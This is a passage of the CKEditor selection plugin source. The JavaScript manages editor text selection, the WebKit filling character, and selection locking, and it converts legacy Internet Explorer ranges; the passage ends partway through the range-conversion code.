/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	// #### checkSelectionChange : START

	// The selection change check basically saves the element parent tree of
	// the current node and check it on successive requests. If there is any
	// change on the tree, then the selectionChange event gets fired.
	function checkSelectionChange() {
		// Editor may have no selection at all.
		var sel = this.getSelection( 1 );
		if ( sel.getType() == CKEDITOR.SELECTION_NONE )
			return;

		this.fire( 'selectionCheck', sel );

		var currentPath = this.elementPath();
		if ( !currentPath.compare( this._.selectionPreviousPath ) ) {
			this._.selectionPreviousPath = currentPath;
			this.fire( 'selectionChange', { selection: sel, path: currentPath } );
		}
	}

	var checkSelectionChangeTimer, checkSelectionChangeTimeoutPending;

	function checkSelectionChangeTimeout() {
		// Firing the "OnSelectionChange" event on every key press started to
		// be too slow. This function guarantees that there will be at least
		// 200ms delay between selection checks.

		checkSelectionChangeTimeoutPending = true;

		if ( checkSelectionChangeTimer )
			return;

		checkSelectionChangeTimeoutExec.call( this );

		checkSelectionChangeTimer = CKEDITOR.tools.setTimeout( checkSelectionChangeTimeoutExec, 200, this );
	}

	function checkSelectionChangeTimeoutExec() {
		checkSelectionChangeTimer = null;

		if ( checkSelectionChangeTimeoutPending ) {
			// Call this with a timeout so the browser properly moves the
			// selection after the mouseup. It happened that the selection was
			// being moved after the mouseup when clicking inside selected text
			// with Firefox.
			CKEDITOR.tools.setTimeout( checkSelectionChange, 0, this );

			checkSelectionChangeTimeoutPending = false;
		}
	}

	// #### checkSelectionChange : END

	var isVisible = CKEDITOR.dom.walker.invisible( 1 );
	function rangeRequiresFix( range ) {
		function isTextCt( node, isAtEnd ) {
			if ( !node || node.type == CKEDITOR.NODE_TEXT )
				return false;

			var testRng = range.clone();
			return testRng[ 'moveToElementEdit' + ( isAtEnd ? 'End' : 'Start' ) ]( node );
		}

		// Range root must be the editable element, it's to avoid creating filler char
		// on any temporary internal selection.
		if ( !( range.root instanceof CKEDITOR.editable ) ) {
			return false;
		}

		var ct = range.startContainer;

		var previous = range.getPreviousNode( isVisible, null, ct ),
			next = range.getNextNode( isVisible, null, ct );

		// Any adjacent text container may absorb the cursor, e.g.
		// <p><strong>text</strong>^foo</p>
		// <p>foo^<strong>text</strong></p>
		// <div>^<p>foo</p></div>
		if ( isTextCt( previous ) || isTextCt( next, 1 ) )
			return true;

		// Empty block/inline element is also affected. <span>^</span>, <p>^</p> (#7222)
		if ( !( previous || next ) && !( ct.type == CKEDITOR.NODE_ELEMENT && ct.isBlockBoundary() && ct.getBogus() ) )
			return true;

		return false;
	}

	function createFillingChar( element ) {
		removeFillingChar( element, false );

		var fillingChar = element.getDocument().createText( '\u200B' );
		element.setCustomData( 'cke-fillingChar', fillingChar );

		return fillingChar;
	}

	function getFillingChar( element ) {
		return element.getCustomData( 'cke-fillingChar' );
	}

	// Checks if a filling char has been used, eventualy removing it (#1272).
	function checkFillingChar( element ) {
		var fillingChar = getFillingChar( element );
		if ( fillingChar ) {
			// Use this flag to avoid removing the filling char right after
			// creating it.
			if ( fillingChar.getCustomData( 'ready' ) )
				removeFillingChar( element );
			else
				fillingChar.setCustomData( 'ready', 1 );
		}
	}

	function removeFillingChar( element, keepSelection ) {
		var fillingChar = element && element.removeCustomData( 'cke-fillingChar' );
		if ( fillingChar ) {

			// Text selection position might get mangled by
			// subsequent dom modification, save it now for restoring. (#8617)
			if ( keepSelection !== false )
			{
				var bm,
					doc = element.getDocument(),
					sel = doc.getSelection().getNative(),
					// Be error proof.
					range = sel && sel.type != 'None' && sel.getRangeAt( 0 );

				if ( fillingChar.getLength() > 1 && range && range.intersectsNode( fillingChar.$ ) ) {
					bm = [ sel.anchorOffset, sel.focusOffset ];

					// Anticipate the offset change brought by the removed char.
					var startAffected = sel.anchorNode == fillingChar.$ && sel.anchorOffset > 0,
						endAffected = sel.focusNode == fillingChar.$ && sel.focusOffset > 0;
					startAffected && bm[ 0 ]--;
					endAffected && bm[ 1 ]--;

					// Revert the bookmark order on reverse selection.
					isReversedSelection( sel ) && bm.unshift( bm.pop() );
				}
			}

			// We can't simply remove the filling node because the user
			// will actually enlarge it when typing, so we just remove the
			// invisible char from it.
			fillingChar.setText( replaceFillingChar( fillingChar.getText() ) );

			// Restore the bookmark.
			if ( bm ) {
				var rng = sel.getRangeAt( 0 );
				rng.setStart( rng.startContainer, bm[ 0 ] );
				rng.setEnd( rng.startContainer, bm[ 1 ] );
				sel.removeAllRanges();
				sel.addRange( rng );
			}
		}
	}

	function replaceFillingChar( html ) {
		return html.replace( /\u200B( )?/g, function( match ) {
			// #10291 if filling char is followed by a space replace it with nbsp.
			return match[ 1 ] ? '\xa0' : '';
		} );
	}

	function isReversedSelection( sel ) {
		if ( !sel.isCollapsed ) {
			var range = sel.getRangeAt( 0 );
			// Potentially alter an reversed selection range.
			range.setStart( sel.anchorNode, sel.anchorOffset );
			range.setEnd( sel.focusNode, sel.focusOffset );
			return range.collapsed;
		}
	}

	// Read the comments in selection constructor.
	function fixInitialSelection( root, nativeSel, doFocus ) {
		// It may happen that setting proper selection will
		// cause focus to be fired (even without actually focusing root).
		// Cancel it because focus shouldn't be fired when retriving selection. (#10115)
		var listener = root.on( 'focus', function( evt ) {
			evt.cancel();
		}, null, null, -100 );

		// FF && Webkit.
		if ( !CKEDITOR.env.ie ) {
			var range = new CKEDITOR.dom.range( root );
			range.moveToElementEditStart( root );

			var nativeRange = root.getDocument().$.createRange();
			nativeRange.setStart( range.startContainer.$, range.startOffset );
			nativeRange.collapse( 1 );

			nativeSel.removeAllRanges();
			nativeSel.addRange( nativeRange );
		}
		else {
			// IE in specific case may also fire selectionchange.
			// We cannot block bubbling selectionchange, so at least we
			// can prevent from falling into inf recursion caused by fix for #9699
			// (see wysiwygarea plugin).
			// http://dev.ckeditor.com/ticket/10438#comment:13
			var listener2 = root.getDocument().on( 'selectionchange', function( evt ) {
				evt.cancel();
			}, null, null, -100 );
		}

		doFocus && root.focus();

		listener.removeListener();
		listener2 && listener2.removeListener();
	}

	// Setup all editor instances for the necessary selection hooks.
	CKEDITOR.on( 'instanceCreated', function( ev ) {
		var editor = ev.editor;

		/**
		 * @event selectionChange
		 *
		 * @member CKEDITOR.editor
 		 * @param {CKEDITOR.editor} editor This editor instance.
 		 * @param data
 		 * @param {CKEDITOR.dom.selection} data.selection
 		 * @param {CKEDITOR.dom.elementPath} data.path
		 */
		editor.define( 'selectionChange', { errorProof:1 } );

		editor.on( 'contentDom', function() {
			var doc = editor.document,
				outerDoc = CKEDITOR.document,
				editable = editor.editable(),
				body = doc.getBody(),
				html = doc.getDocumentElement();

			var isInline = editable.isInline();

			var restoreSel;

			// Give the editable an initial selection on first focus,
			// put selection at a consistent position at the start
			// of the contents. (#9507)
			if ( CKEDITOR.env.gecko ) {
				editable.attachListener( editable, 'focus', function( evt ) {
					evt.removeListener();

					if ( restoreSel !== 0 ) {
						var nativ = editor.getSelection().getNative();
						// Do it only if the native selection is at an unwanted
						// place (at the very start of the editable). #10119
						if ( nativ.isCollapsed && nativ.anchorNode == editable.$ ) {
							var rng = editor.createRange();
							rng.moveToElementEditStart( editable );
							rng.select();
						}
					}
				}, null, null, -2 );
			}

			// Plays the magic here to restore/save dom selection on editable focus/blur.
			editable.attachListener( editable, 'focus', function() {
				editor.unlockSelection( restoreSel );
				restoreSel = 0;
			}, null, null, -1 );

			// Disable selection restoring when clicking in.
			editable.attachListener( editable, 'mousedown', function() {
				restoreSel = 0;
			});

			// Browsers could loose the selection once the editable lost focus,
			// in such case we need to reproduce it by saving a locked selection
			// and restoring it upon focus gain.
			if ( CKEDITOR.env.ie || CKEDITOR.env.opera || isInline ) {
				var lastSel;
				// Save a fresh copy of the selection.
				function saveSel() {
					lastSel = editor.getSelection( 1 );
					lastSel.lock();
				}

				// For old IEs, we can retrieve the last correct DOM selection upon the "beforedeactivate" event.
				// For the rest, a more frequent check is required for each selection change made.
				if ( isMSSelection )
					editable.attachListener( editable, 'beforedeactivate', saveSel, null, null, -1 );
				else
					editable.attachListener( editor, 'selectionCheck', saveSel, null, null, -1 );

				editable.attachListener( editable, 'blur', function() {
					editor.lockSelection( lastSel );
					restoreSel = 1;
				}, null, null, -1 );
			}

			// The following selection related fixes applies to only framed editable.
			if ( CKEDITOR.env.ie && !isInline ) {
				var scroll;
				editable.attachListener( editable, 'mousedown', function( evt ) {
					// IE scrolls document to top on right mousedown
					// when editor has no focus, remember this scroll
					// position and revert it before context menu opens. (#5778)
					if ( evt.data.$.button == 2 ) {
						var sel = editor.document.$.selection;
						if ( sel.type == 'None' )
							scroll = editor.window.getScrollPosition();
					}
				});

				editable.attachListener( editable, 'mouseup', function( evt ) {
					// Restore recorded scroll position when needed on right mouseup.
					if ( evt.data.$.button == 2 && scroll ) {
						editor.document.$.documentElement.scrollLeft = scroll.x;
						editor.document.$.documentElement.scrollTop = scroll.y;
					}
					scroll = null;
				});

				// When content doc is in standards mode, IE doesn't focus the editor when
				// clicking at the region below body (on html element) content, we emulate
				// the normal behavior on old IEs. (#1659, #7932)
				if ( doc.$.compatMode != 'BackCompat' ) {
					if ( CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat ) {
						function moveRangeToPoint( range, x, y ) {
							// Error prune in IE7. (#9034, #9110)
							try { range.moveToPoint( x, y ); } catch ( e ) {}
						}

						html.on( 'mousedown', function( evt ) {
							evt = evt.data;

							// Expand the text range along with mouse move.
							function onHover( evt ) {
								evt = evt.data.$;
								if ( textRng ) {
									// Read the current cursor.
									var rngEnd = body.$.createTextRange();

									moveRangeToPoint( rngEnd, evt.x, evt.y );

									// Handle drag directions.
									textRng.setEndPoint(
										startRng.compareEndPoints( 'StartToStart', rngEnd ) < 0 ?
										'EndToEnd' : 'StartToStart', rngEnd );

									// Update selection with new range.
									textRng.select();
								}
							}

							function removeListeners() {
								outerDoc.removeListener( 'mouseup', onSelectEnd );
								html.removeListener( 'mouseup', onSelectEnd );
							}

							function onSelectEnd() {

								html.removeListener( 'mousemove', onHover );
								removeListeners();

								// Make it in effect on mouse up. (#9022)
								textRng.select();
							}


							// We're sure that the click happens at the region
							// below body, but not on scrollbar.
							if ( evt.getTarget().is( 'html' ) &&
									 evt.$.y < html.$.clientHeight &&
									 evt.$.x < html.$.clientWidth ) {
								// Start to build the text range.
								var textRng = body.$.createTextRange();
								moveRangeToPoint( textRng, evt.$.x, evt.$.y );

								// Records the dragging start of the above text range.
								var startRng = textRng.duplicate();

								html.on( 'mousemove', onHover );
								outerDoc.on( 'mouseup', onSelectEnd );
								html.on( 'mouseup', onSelectEnd );
							}
						});
					}

					// It's much simpler for IE8+, we just need to reselect the reported range.
					if ( CKEDITOR.env.version > 7 ) {
						html.on( 'mousedown', function( evt ) {
							if ( evt.data.getTarget().is( 'html' ) ) {
								// Limit the text selection mouse move inside of editable. (#9715)
								outerDoc.on( 'mouseup', onSelectEnd );
								html.on( 'mouseup', onSelectEnd );
							}

						});

						function removeListeners() {
							outerDoc.removeListener( 'mouseup', onSelectEnd );
							html.removeListener( 'mouseup', onSelectEnd );
						}

						function onSelectEnd() {
							removeListeners();

							// The event is not fired when clicking on the scrollbars,
							// so we can safely check the following to understand
							// whether the empty space following <body> has been clicked.
								var sel = CKEDITOR.document.$.selection,
									range = sel.createRange();
								// The selection range is reported on host, but actually it should applies to the content doc.
								if ( sel.type != 'None' && range.parentElement().ownerDocument == doc.$ )
									range.select();
						}
					}
				}
			}

			// We check the selection change:
			// 1. Upon "selectionchange" event from the editable element. (which might be faked event fired by our code)
			// 2. After the accomplish of keyboard and mouse events.
			editable.attachListener( editable, 'selectionchange', checkSelectionChange, editor );
			editable.attachListener( editable, 'keyup', checkSelectionChangeTimeout, editor );
			// Always fire the selection change on focus gain.
			editable.attachListener( editable, 'focus', function() {
				editor.forceNextSelectionCheck();
				editor.selectionChange( 1 );
			});

			// #9699: On Webkit&Gecko in inline editor and on Opera in framed editor we have to check selection
			// when it was changed by dragging and releasing mouse button outside editable. Dragging (mousedown)
			// has to be initialized in editable, but for mouseup we listen on document element.
			// On Opera, listening on document element, helps even if mouse button is released outside iframe.
			if ( isInline ? ( CKEDITOR.env.webkit || CKEDITOR.env.gecko ) : CKEDITOR.env.opera ) {
				var mouseDown;
				editable.attachListener( editable, 'mousedown', function() {
					mouseDown = 1;
				});
				editable.attachListener( doc.getDocumentElement(), 'mouseup', function() {
					if ( mouseDown )
						checkSelectionChangeTimeout.call( editor );
					mouseDown = 0;
				});
			}
			// In all other cases listen on simple mouseup over editable, as we did before #9699.
			//
			// Use document instead of editable in non-IEs for observing mouseup
			// since editable won't fire the event if selection process started within iframe and ended out
			// of the editor (#9851).
			else
				editable.attachListener( CKEDITOR.env.ie ? editable : doc.getDocumentElement(), 'mouseup', checkSelectionChangeTimeout, editor );

			if ( CKEDITOR.env.webkit ) {
				// Before keystroke is handled by editor, check to remove the filling char.
				editable.attachListener( doc, 'keydown', function( evt ) {
					var key = evt.data.getKey();
					// Remove the filling char before some keys get
					// executed, so they'll not get blocked by it.
					switch ( key ) {
						case 13: // ENTER
						case 33: // PAGEUP
						case 34: // PAGEDOWN
						case 35: // HOME
						case 36: // END
						case 37: // LEFT-ARROW
						case 39: // RIGHT-ARROW
						case 8: // BACKSPACE
						case 45: // INS
						case 46: // DEl
							removeFillingChar( editable );
					}

				}, null, null, -1 );
			}
		});

		// Clear the cached range path before unload. (#7174)
		editor.on( 'contentDomUnload', editor.forceNextSelectionCheck, editor );
		// Check selection change on data reload.
		editor.on( 'dataReady', function() {
			editor.selectionChange( 1 );
		});

		function clearSelection() {
			var sel = editor.getSelection();
			sel && sel.removeAllRanges();
		}

		// Clear dom selection before editable destroying to fix some browser
		// craziness.

		// IE9 might cease to work if there's an object selection inside the iframe (#7639).
		CKEDITOR.env.ie9Compat && editor.on( 'beforeDestroy', clearSelection, null, null, 9 );
		// Webkit's selection will mess up after the data loading.
		CKEDITOR.env.webkit && editor.on( 'setData', clearSelection );

		// Invalidate locked selection when unloading DOM (e.g. after setData). (#9521)
		editor.on( 'contentDomUnload', function() {
			editor.unlockSelection();
		});

	});

	CKEDITOR.on( 'instanceReady', function( evt ) {
		var editor = evt.editor;

		// On WebKit only, we need a special "filling" char on some situations
		// (#1272). Here we set the events that should invalidate that char.
		if ( CKEDITOR.env.webkit ) {
			editor.on( 'selectionChange', function() {
				checkFillingChar( editor.editable() );
			}, null, null, -1 );
			editor.on( 'beforeSetMode', function() {
				removeFillingChar( editor.editable() );
			}, null, null, -1 );

			var fillingCharBefore, resetSelection;

			function beforeData() {
				var editable = editor.editable();
				if ( !editable )
					return;

				var fillingChar = getFillingChar( editable );

				if ( fillingChar ) {
					// If cursor is right blinking by side of the filler node, save it for restoring,
					// as the following text substitution will blind it. (#7437)
					var sel = editor.document.$.defaultView.getSelection();
					if ( sel.type == 'Caret' && sel.anchorNode == fillingChar.$ )
						resetSelection = 1;

					fillingCharBefore = fillingChar.getText();
					fillingChar.setText( replaceFillingChar( fillingCharBefore ) );
				}
			}

			function afterData() {
				var editable = editor.editable();
				if ( !editable )
					return;

				var fillingChar = getFillingChar( editable );

				if ( fillingChar ) {
					fillingChar.setText( fillingCharBefore );

					if ( resetSelection ) {
						editor.document.$.defaultView.getSelection().setPosition( fillingChar.$, fillingChar.getLength() );
						resetSelection = 0;
					}
				}
			}

			editor.on( 'beforeUndoImage', beforeData );
			editor.on( 'afterUndoImage', afterData );
			editor.on( 'beforeGetData', beforeData, null, null, 0 );
			editor.on( 'getData', afterData );
		}
	});

	/**
	 * Check the selection change in editor and potentially fires
	 * the {@link CKEDITOR.editor#event-selectionChange} event.
	 *
	 * @method
	 * @member CKEDITOR.editor
	 * @param {Boolean} [checkNow=false] Force the check to happen immediately
	 * instead of coming with a timeout delay (default).
	 */
	CKEDITOR.editor.prototype.selectionChange = function( checkNow ) {
		( checkNow ? checkSelectionChange : checkSelectionChangeTimeout ).call( this );
	};

	/**
	 * Retrieve the editor selection in scope of  editable element.
	 *
	 * **Note:** Since the native browser selection provides only one single
	 * selection at a time per document, so if editor's editable element has lost focus,
	 * this method will return a null value unless the {@link CKEDITOR.editor#lockSelection}
	 * has been called beforehand so the saved selection is retrieved.
	 *
	 *		var selection = CKEDITOR.instances.editor1.getSelection();
	 *		alert( selection.getType() );
	 *
	 * @method
	 * @member CKEDITOR.editor
	 * @param {Boolean} forceRealSelection
	 * @returns {CKEDITOR.dom.selection} A selection object or null if not available for the moment.
	 * @todo param
	 */
	CKEDITOR.editor.prototype.getSelection = function( forceRealSelection ) {
		// Check if there exists a locked selection.
		if ( this._.savedSelection && !forceRealSelection )
			return this._.savedSelection;

		// Editable element might be absent.
		var editable = this.editable();
		return editable ? new CKEDITOR.dom.selection( editable ) : null;
	};

	/**
	 * Locks the selection made in the editor in order to make it possible to
	 * manipulate it without browser interference. A locked selection is
	 * cached and remains unchanged until it is released with the
	 * {@link CKEDITOR.editor#unlockSelection} method.
	 *
	 * @method
	 * @member CKEDITOR.editor
	 * @param {CKEDITOR.dom.selection} [sel] Specify the selection to be locked.
	 * @returns {Boolean} `true` if selection was locked.
	 */
	CKEDITOR.editor.prototype.lockSelection = function( sel ) {
			sel = sel || this.getSelection( 1 );
			if ( sel.getType() != CKEDITOR.SELECTION_NONE ) {
				!sel.isLocked && sel.lock();
				this._.savedSelection = sel;
				return true;
			}
		return false;
	};

	/**
	 * Unlocks the selection made in the editor and locked with the
	 * {@link CKEDITOR.editor#unlockSelection} method. An unlocked selection
	 * is no longer cached and can be changed.
	 *
	 * @method
	 * @member CKEDITOR.editor
	 * @param {Boolean} [restore] If set to `true`, the selection is
	 * restored back to the selection saved earlier by using the
	 * {@link CKEDITOR.dom.selection#lock} method.
	 */
	CKEDITOR.editor.prototype.unlockSelection = function( restore ) {
		var sel = this._.savedSelection;
		if ( sel ) {
			sel.unlock( restore );
			delete this._.savedSelection;
			return true;
		}

		return false;
	};

	/**
	 * @method
	 * @member CKEDITOR.editor
	 * @todo
	 */
	CKEDITOR.editor.prototype.forceNextSelectionCheck = function() {
		delete this._.selectionPreviousPath;
	};

	/**
	 * Gets the current selection in context of the document's body element.
	 *
	 *		var selection = CKEDITOR.instances.editor1.document.getSelection();
	 *		alert( selection.getType() );
	 *
	 * @method
	 * @member CKEDITOR.dom.document
	 * @returns {CKEDITOR.dom.selection} A selection object.
	 */
	CKEDITOR.dom.document.prototype.getSelection = function() {
		return new CKEDITOR.dom.selection( this );
	};

	/**
	 * Select this range as the only one with {@link CKEDITOR.dom.selection#selectRanges}.
	 *
	 * @method
	 * @returns {CKEDITOR.dom.selection}
	 * @member CKEDITOR.dom.range
	 */
	CKEDITOR.dom.range.prototype.select = function() {
		var sel = this.root instanceof CKEDITOR.editable ? this.root.editor.getSelection() : new CKEDITOR.dom.selection( this.root );

		sel.selectRanges( [ this ] );

		return sel;
	};

	/**
	 * No selection.
	 *
	 *		if ( editor.getSelection().getType() == CKEDITOR.SELECTION_NONE )
	 *			alert( 'Nothing is selected' );
	 *
	 * @readonly
	 * @property {Number} [=1]
	 * @member CKEDITOR
	 */
	CKEDITOR.SELECTION_NONE = 1;

	/**
	 * A text or a collapsed selection.
	 *
	 *		if ( editor.getSelection().getType() == CKEDITOR.SELECTION_TEXT )
	 *			alert( 'A text is selected' );
	 *
	 * @readonly
	 * @property {Number} [=2]
	 * @member CKEDITOR
	 */
	CKEDITOR.SELECTION_TEXT = 2;

	/**
	 * Element selection.
	 *
	 *		if ( editor.getSelection().getType() == CKEDITOR.SELECTION_ELEMENT )
	 *			alert( 'An element is selected' );
	 *
	 * @readonly
	 * @property {Number} [=3]
	 * @member CKEDITOR
	 */
	CKEDITOR.SELECTION_ELEMENT = 3;

	var isMSSelection = typeof window.getSelection != 'function';

	/**
	 * Manipulates the selection within a DOM element, if the current browser selection
	 * spans outside of the element, an empty selection object is returned.
	 *
	 *		var sel = new CKEDITOR.dom.selection( CKEDITOR.document );
	 *
	 * @class
	 * @constructor Creates a selection class instance.
	 * @param {CKEDITOR.dom.document} target The DOM document/element that the DOM selection
	 * is restrained to, only selection spans within the target element is considered as valid.
	 */
	CKEDITOR.dom.selection = function( target ) {
		var isElement = target instanceof CKEDITOR.dom.element,
			root;

		this.document = target instanceof CKEDITOR.dom.document ? target : target.getDocument();
		this.root = root = isElement ? target : this.document.getBody();
		this.isLocked = 0;
		this._ = {
			cache: {}
		};

		// On WebKit, it may happen that we've already have focus
		// on the editable element while still having no selection
		// available. We normalize it here by replicating the
		// behavior of other browsers.
		//
		// Webkit's condition covers also the case when editable hasn't been focused
		// at all. Thanks to this hack Webkit always has selection in the right place.
		//
		// On FF and IE we only fix the first case, when editable was activated
		// but the selection is broken - usually this happens after setData if editor was focused.

		var sel = isMSSelection ? this.document.$.selection : this.document.getWindow().$.getSelection();

		if ( CKEDITOR.env.webkit ) {
			if ( sel.type == 'None' && this.document.getActive().equals( root ) || sel.type == 'Caret' && sel.anchorNode.nodeType == CKEDITOR.NODE_DOCUMENT )
				fixInitialSelection( root, sel );
		}
		else if ( CKEDITOR.env.gecko ) {
			if ( sel && this.document.getActive().equals( root ) &&
				sel.anchorNode && sel.anchorNode.nodeType == CKEDITOR.NODE_DOCUMENT )
				fixInitialSelection( root, sel, true );
		}
		else if ( CKEDITOR.env.ie ) {
			var active;

			// IE8,9 throw unspecified error when trying to access document.$.activeElement.
			try {
				active = this.document.getActive();
			} catch ( e ) {}

			// IEs 9+.
			if ( !isMSSelection ) {
				var anchorNode = sel && sel.anchorNode;

				if ( anchorNode )
					anchorNode = new CKEDITOR.dom.node( anchorNode );

				if ( active && active.equals( this.document.getDocumentElement() ) &&
					anchorNode && ( root.equals( anchorNode ) || root.contains( anchorNode ) ) )
					fixInitialSelection( root, null, true );
			}
			// IEs 7&8.
			else if ( sel.type == 'None' && active && active.equals( this.document.getDocumentElement() ) )
				fixInitialSelection( root, null, true );
		}

		// Check whether browser focus is really inside of the editable element.

		var nativeSel = this.getNative(),
			rangeParent,
			range;

		if ( nativeSel ) {
			if ( nativeSel.getRangeAt ) {
				range = nativeSel.rangeCount && nativeSel.getRangeAt( 0 );
				rangeParent = range && new CKEDITOR.dom.node( range.commonAncestorContainer );
			}
			// For old IEs.
			else {
				// Sometimes, mostly when selection is close to the table or hr,
				// IE throws "Unspecified error".
				try {
					range = nativeSel.createRange();
				} catch ( err ) {}
				rangeParent = range && CKEDITOR.dom.element.get( range.item && range.item( 0 ) || range.parentElement() );
			}
		}

		// Selection out of concerned range, empty the selection.
		if ( !( rangeParent && ( root.equals( rangeParent ) || root.contains( rangeParent ) ) ) ) {
			this._.cache.type = CKEDITOR.SELECTION_NONE;
			this._.cache.startElement = null;
			this._.cache.selectedElement = null;
			this._.cache.selectedText = '';
			this._.cache.ranges = new CKEDITOR.dom.rangeList();
		}

		return this;
	};

	var styleObjectElements = { img:1,hr:1,li:1,table:1,tr:1,td:1,th:1,embed:1,object:1,ol:1,ul:1,a:1,input:1,form:1,select:1,textarea:1,button:1,fieldset:1,thead:1,tfoot:1 };

	CKEDITOR.dom.selection.prototype = {
		/**
		 * Gets the native selection object from the browser.
		 *
		 *		var selection = editor.getSelection().getNative();
		 *
		 * @returns {Object} The native browser selection object.
		 */
		getNative: function() {
			if ( this._.cache.nativeSel !== undefined )
				return this._.cache.nativeSel;

			return ( this._.cache.nativeSel = isMSSelection ? this.document.$.selection : this.document.getWindow().$.getSelection() );
		},

		/**
		 * Gets the type of the current selection. The following values are
		 * available:
		 *
		 * * {@link CKEDITOR#SELECTION_NONE} (1): No selection.
		 * * {@link CKEDITOR#SELECTION_TEXT} (2): A text or a collapsed selection is selected.
		 * * {@link CKEDITOR#SELECTION_ELEMENT} (3): An element is selected.
		 *
		 * Example:
		 *
		 *		if ( editor.getSelection().getType() == CKEDITOR.SELECTION_TEXT )
		 *			alert( 'A text is selected' );
		 *
		 * @method
		 * @returns {Number} One of the following constant values: {@link CKEDITOR#SELECTION_NONE},
		 * {@link CKEDITOR#SELECTION_TEXT} or {@link CKEDITOR#SELECTION_ELEMENT}.
		 */
		getType: isMSSelection ?
		function() {
			var cache = this._.cache;
			if ( cache.type )
				return cache.type;

			var type = CKEDITOR.SELECTION_NONE;

			try {
				var sel = this.getNative(),
					ieType = sel.type;

				if ( ieType == 'Text' )
					type = CKEDITOR.SELECTION_TEXT;

				if ( ieType == 'Control' )
					type = CKEDITOR.SELECTION_ELEMENT;

				// It is possible that we can still get a text range
				// object even when type == 'None' is returned by IE.
				// So we'd better check the object returned by
				// createRange() rather than by looking at the type.
				if ( sel.createRange().parentElement() )
					type = CKEDITOR.SELECTION_TEXT;
			} catch ( e ) {}

			return ( cache.type = type );
		} : function() {
			var cache = this._.cache;
			if ( cache.type )
				return cache.type;

			var type = CKEDITOR.SELECTION_TEXT;

			var sel = this.getNative();

			if ( !( sel && sel.rangeCount ) )
				type = CKEDITOR.SELECTION_NONE;
			else if ( sel.rangeCount == 1 ) {
				// Check if the actual selection is a control (IMG,
				// TABLE, HR, etc...).

				var range = sel.getRangeAt( 0 ),
					startContainer = range.startContainer;

				if ( startContainer == range.endContainer && startContainer.nodeType == 1 && ( range.endOffset - range.startOffset ) == 1 && styleObjectElements[ startContainer.childNodes[ range.startOffset ].nodeName.toLowerCase() ] ) {
					type = CKEDITOR.SELECTION_ELEMENT;
				}
			}

			return ( cache.type = type );
		},

		/**
		 * Retrieves the {@link CKEDITOR.dom.range} instances that represent the current selection.
		 *
		 * Note: Some browsers return multiple ranges even for a continuous selection. Firefox, for example, returns
		 * one range for each table cell when one or more table rows are selected.
		 *
		 *		var ranges = selection.getRanges();
		 *		alert( ranges.length );
		 *
		 * @method
		 * @param {Boolean} [onlyEditables] If set to `true`, this function retrives editable ranges only.
		 * @returns {Array} Range instances that represent the current selection.
		 */
		getRanges: (function() {
			var func = isMSSelection ? ( function() {
				function getNodeIndex( node ) {
					return new CKEDITOR.dom.node( node ).getIndex();
				}

				// Finds the container and offset for a specific boundary
				// of an IE range.
				var getBoundaryInformation = function( range, start ) {
						// Creates a collapsed range at the requested boundary.
						range = range.duplicate();
						range.collapse( start );

						// Gets the element that encloses the range entirely.
						var parent = range.parentElement(),
							doc = parent.ownerDocument;

						// Empty parent element, e.g. <i>^</i>
						if ( !parent.hasChildNodes() )
							return { container: parent, offset: 0 };

						var siblings = parent.children,
							child, sibling,
							testRange = range.duplicate(),
							startIndex = 0,
							endIndex = siblings.length - 1,
							index = -1,
							position, distance, container;

						// Binary search over all element childs to test the range to see whether
						// range is right on the boundary of one element.
						while ( startIndex <= endIndex ) {
							index = Math.floor( ( startIndex + endIndex ) / 2 );
							child = siblings[ index ];
							testRange.moveToElementText( child );
							position = testRange.compareEndPoints( 'StartToStart', range );

							if ( position > 0 )
								endIndex = index - 1;
							else if ( position < 0 )
								startIndex = index + 1;
							else
								return { container: parent, offset: getNodeIndex( child ) };
						}

						// All childs are text nodes,
						// or to the right hand of test range are all text nodes. (#6992)
						if ( index == -1 || index == siblings.length - 1 && position < 0 ) {
							// Adapt test range to embrace the entire parent contents.
							testRange.moveToElementText( parent );
							testRange.setEndPoint( 'StartToStart', range );

							// IE report line break as CRLF with range.text but
							// only LF with textnode.nodeValue, normalize them to avoid
							// breaking character counting logic below. (#3949)
							distance = testRange.text.replace( /(\r\n|\r)/g, '\n' ).length;

							siblings = parent.childNodes;

							// Actual range anchor right beside test range at the boundary of text node.
							if ( !distance ) {
								child = siblings[ siblings.length - 1 ];

								if ( child.nodeType != CKEDITOR.NODE_TEXT )
									return { container: parent, offset: siblings.length };
								else
									return { container: child, offset: child.nodeValue.length };
							}

							// Start the measuring until distance overflows, meanwhile count the text nodes.
							var i = siblings.length;
							while ( distance > 0 && i > 0 ) {
								sibling = siblings[ --i ];
								if ( sibling.nodeType == CKEDITOR.NODE_TEXT ) {
									container = sibling;
									distance -= sibling.nodeValue.length;
								}
							}

							return { container: container, offset: -distance };
						}
						// Test range was one offset beyond OR behind the anchored text node.
						else {
							// Adapt one side of test range to the actual range
							// for measuring the offset between them.
							testRange.collapse( position > 0 ? true : false );
							testRange.setEndPoint( position > 0 ? 'StartToStart' : 'EndToStart', range );

							// IE report line break as CRLF with range.text but
							// only LF with textnode.nodeValue, normalize them to avoid
							// breaking character counting logic below. (#3949)
							distance = testRange.text.replace( /(\r\n|\r)/g, '\n' ).length;

							// Actual range anchor right beside test range at the inner boundary of text node.
							if ( !distance )
								return { container: parent, offset: getNodeIndex( child ) + ( position > 0 ? 0 : 1 ) };

							// Start the measuring until distance overflows, meanwhile count the text nodes.
							while ( distance > 0 ) {
								try {
									sibling = child[ position > 0 ? 'previousSibling' : 'nextSibling' ];
									if ( sibling.nodeType == CKEDITOR.NODE_TEXT ) {
										distance -= sibling.nodeValue.length;
										container = sibling;
									}
									child = sibling;
								}
								// Measurement in IE could be somtimes wrong because of <select> element. (#4611)
								catch ( e ) {
									return { container: parent, offset: getNodeIndex( child ) };
								}
							}

							return { container: container, offset: position > 0 ? -distance : container.nodeValue.length + distance };
						}
					};

				return function() {
					// IE doesn't have range support (in the W3C way), so we
					// need to do some magic to transform selections into
					// CKEDITOR.dom.range instances.

					var sel = this.getNative(),
						nativeRange = sel && sel.createRange(),
						type = this.getType(),
						range;

					if ( !sel )
						return [];

					if ( type == CKEDITOR.SELECTION_TEXT ) {
						range = new CKEDITOR.dom.range( this.root );

						var boundaryInfo = getBoundaryInformation( nativeRange, true );
						range.setStart( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

						boundaryInfo = getBoundaryInformation( nativeRange );
						range.setEnd( new CKEDITOR.dom.node( boundaryInfo.container ), boundaryInfo.offset );

						// Correct an invalid IE range case on empty list item. (#5850)
